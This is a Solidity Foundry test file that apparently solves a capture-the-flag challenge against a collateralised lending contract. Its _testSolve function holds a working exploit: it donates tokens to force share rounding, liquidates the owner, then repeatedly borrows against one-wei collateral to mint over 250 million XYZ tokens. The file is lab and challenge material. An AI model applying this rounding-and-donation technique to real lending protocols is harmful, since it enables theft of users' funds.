// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Challenge} from "../src/xyz/src/Challenge.sol";
import {Manager, ProtocolMath} from "../src/xyz/src/Manager.sol";
import {PriceFeed} from "../src/xyz/src/PriceFeed.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import {Token} from "../src/xyz/src/Token.sol";
import {ERC20Signal} from "../src/xyz/src/ERC20Signal.sol";

contract XYZTest is Test {
    Challenge challenge;
    Token sETH;
    Manager manager;
    Token XYZ;
    PriceFeed priceFeed;

    address system = address(0x12312312);
    address player = address(this);

    function setUp() public {
        vm.startPrank(system);
        sETH = new Token(system, "sETH");
        manager = new Manager();
        XYZ = manager.xyz();
        challenge = new Challenge(XYZ, sETH, manager);
        priceFeed = new PriceFeed();

        manager.addCollateralToken(IERC20(address(sETH)), priceFeed, 20_000_000_000_000_000 ether, 1 ether);
        sETH.mint(system, 2 ether);
        sETH.approve(address(manager), type(uint256).max);

        manager.manage(sETH, 2 ether, true, 3395 ether, true);

        (, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(sETH)));

        printDebugSupply();
        console.log("update signal");
        manager.updateSignal(debtToken, 3520 ether);

        sETH.mint(player, 6000 ether);

        vm.stopPrank();
        console.log("need %e", 250_000_000 ether);

        console.log("--------------------");
    }

    function printDebugSupply() internal {
        (
            ERC20Signal protocolCollateralToken,
            ERC20Signal protocolDebtToken,
            PriceFeed _priceFeed,
            uint256 operationTime,
            uint256 baseRate
        ) = manager.collateralData(IERC20(address(sETH)));
        console.log("---GLOBAL SUPPLY---");
        console.log("debtSignal: %e", protocolDebtToken.signal());
        console.log("collateralSignal: %e", protocolCollateralToken.signal());
        console.log("global Healh: %e", manager.globalHealth(sETH));
        console.log("globalDebt: %e", protocolDebtToken.totalSupply());
        console.log("globalCollateral: %e", protocolCollateralToken.totalSupply());
        console.log("globalXYZ: %e", XYZ.totalSupply());
    }

    function _testSolve() public {
        address liquidatee = manager.owner();

        (
            ERC20Signal protocolCollateralToken,
            ERC20Signal protocolDebtToken,
            PriceFeed _priceFeed,
            uint256 operationTime,
            uint256 baseRate
        ) = manager.collateralData(IERC20(address(sETH)));

        (uint256 price,) = _priceFeed.fetchPrice();
        printDebugSupply();

        sETH.approve(address(manager), type(uint256).max);

        //make some debt for liquidation
        //health  = collateral * price / debt
        //debt = collateral * price / health

        uint256 MIN_CR = 130 * 1e18 / 100;
        // uint256 collateralShare = 2e18;
        // uint256 maxDebt = collateralShare * price / MIN_CR;
        // 6000 ETH max debt 1.0186153846153846153846153e25
        // uint256 minimumDebt = 3000e18;
        // uint256 minCollateral = minimumDebt * MIN_CR / price;
        // console.log("minCollateral %e", minCollateral);
        //price = (2207 ether, 0.01 ether)
        uint256 inputDebt = 3521e18; //35210e18 //
        uint256 inputCollateral = 2.5e18; //500eth max debt 8.48846153846153846153846e23
        inputDebt = inputCollateral * price / MIN_CR;
        console.log("------Add New Debt And Collateral------");

        // holdMinimumDebt(address(0xdaa0));
        // holdMinimumDebt(address(0xdaa1));
        // holdMinimumDebt(address(0xdaa2));
        // printBalance(address(0xdaa0));
        manager.manage(sETH, inputCollateral, true, inputDebt, true);

        printBalance(address(this));
        printBalance(address(liquidatee));
        printDebugSupply();

        //donate to force roundup share
        sETH.transfer(address(manager), 5995e18);

        console.log("------liquidate------");
        manager.liquidate(address(liquidatee));

        printBalance(address(this));
        printDebugSupply();
        // printBalance(address(tester));
        console.log("------liquidate end------");

        // printBalance(address(0xdaa1));
        // printBalance(address(0xdaa2));

        manager.manage(sETH, 1, false, 1.0095e25, true);//@get max loan

        printBalance(address(this));
        // console.log("maxDebt: %e", 6000e18 * price / MIN_CR);

        sETH.transfer(address(0x99999), 5000);
        vm.startPrank(address(0x99999));
        sETH.approve(address(manager), type(uint256).max);
        for (uint256 i = 0; i < 5000; i++) {
            // holdSmallDebt(address(uint160(i + 10000)));
            manager.manage(sETH, 1, true, 8.14e22, true);
            XYZ.transfer(address(this), XYZ.balanceOf(address(0x99999)));
            if (XYZ.balanceOf(address(this)) > 250_000_000 ether) {
                console.log("done", i);
                break;
            }
        }
        vm.stopPrank();
        printBalance(address(this));
    }

    function holdSmallDebt(address prankTarget) internal {
        sETH.transfer(prankTarget, 5);
        vm.startPrank(prankTarget);
        sETH.approve(address(manager), type(uint256).max);
        manager.manage(sETH, 1, true, 8.14e22, true);
        manager.manage(sETH, 1, true, 8.14e22, true);
        manager.manage(sETH, 1, true, 8.14e22, true);
        XYZ.transfer(address(this), XYZ.balanceOf(prankTarget));
        vm.stopPrank();
    }

    function holdFullDebt(address prankTarget, uint256 collateral) internal {
        sETH.transfer(prankTarget, collateral);
        uint256 MIN_CR = 130 * 1e18 / 100;
        vm.startPrank(prankTarget);
        sETH.approve(address(manager), type(uint256).max);
        uint256 price = 2207 ether;
        uint256 debt = collateral * price / MIN_CR;
        manager.manage(sETH, collateral, true, debt, true);
        vm.stopPrank();
    }

    function holdMinimumDebt(address prankTarget) internal {
        uint256 MIN_CR = 130 * 1e18 / 100;
        uint256 minDebt = 3000e18;
        uint256 minCollateral = ((minDebt * MIN_CR) / 2207) / 1e18; //@max debt 3.021892307692307692307e21
        sETH.transfer(prankTarget, minCollateral);
        vm.startPrank(prankTarget);
        sETH.approve(address(manager), type(uint256).max);

        manager.manage(sETH, minCollateral, true, minDebt, true);
        XYZ.transfer(address(this), XYZ.balanceOf(prankTarget));
        vm.stopPrank();
    }

    function printBalance(address target) public {
        (ERC20Signal ct, ERC20Signal dt, PriceFeed _priceFeed, uint256 operationTime, uint256 baseRate) =
            manager.collateralData(IERC20(address(sETH)));
        uint256 debt = dt.balanceOf(address(target));
        uint256 collateral = ct.balanceOf(address(target));
        uint256 price = 2207 ether;
        console.log("--Balance %s --", target);
        console.log("myXYZ:        %e", XYZ.balanceOf(target));
        console.log("myDebt:       %e, share: %e", debt, dt.RealbalanceOf(address(target)));
        console.log("myCollateral: %e, share: %e", collateral, ct.RealbalanceOf(address(target)));
        uint256 health = ProtocolMath._computeHealth(collateral, debt, price);
        console.log("health: %e", health);
    }

    function debtToCollateral(uint256 debt, uint256 price, uint256 health) public pure returns (uint256) {
        return debt * price / health;
    }

    function collateralToDebt(uint256 collateral, uint256 price, uint256 health) public pure returns (uint256) {
        return collateral * price / health;
    }

    //USDC Debt: 2e34 signal. meaning mint 1e16 ETH get 1 WD token
    //ETH Coll: 1e18 signal. meaning mint 1e18 ETH get 1 WC token
}
